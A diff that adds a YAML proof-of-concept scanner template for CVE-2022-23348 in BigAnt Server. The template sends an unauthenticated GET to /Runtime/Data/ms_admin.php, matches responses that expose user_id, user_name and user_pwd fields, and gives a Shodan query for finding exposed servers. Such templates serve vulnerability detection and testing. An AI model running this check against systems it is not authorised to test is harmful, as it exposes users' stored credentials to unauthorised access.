@@ -1,0 +1,16 @@
+id: poc-yaml-bigant-server-ms-admin-php-unauthorized-access
+info:
+  name: BigAnt Server ms_admin.php unauthorized access漏洞(CVE-2022-23348)
+  severity: medium
+  tags:
+  - CVE-2022-23348
+  - 未授权访问
+  finger: bigant_server
+  shodan: http.html:"bigant"
+requests:
+- method: GET
+  path: /Runtime/Data/ms_admin.php
+  expression: status_code == 200 && contains(body,"user_id") && contains(body,"user_name")
+    && contains(body,"user_pwd")
+variables: {}
+transport: http
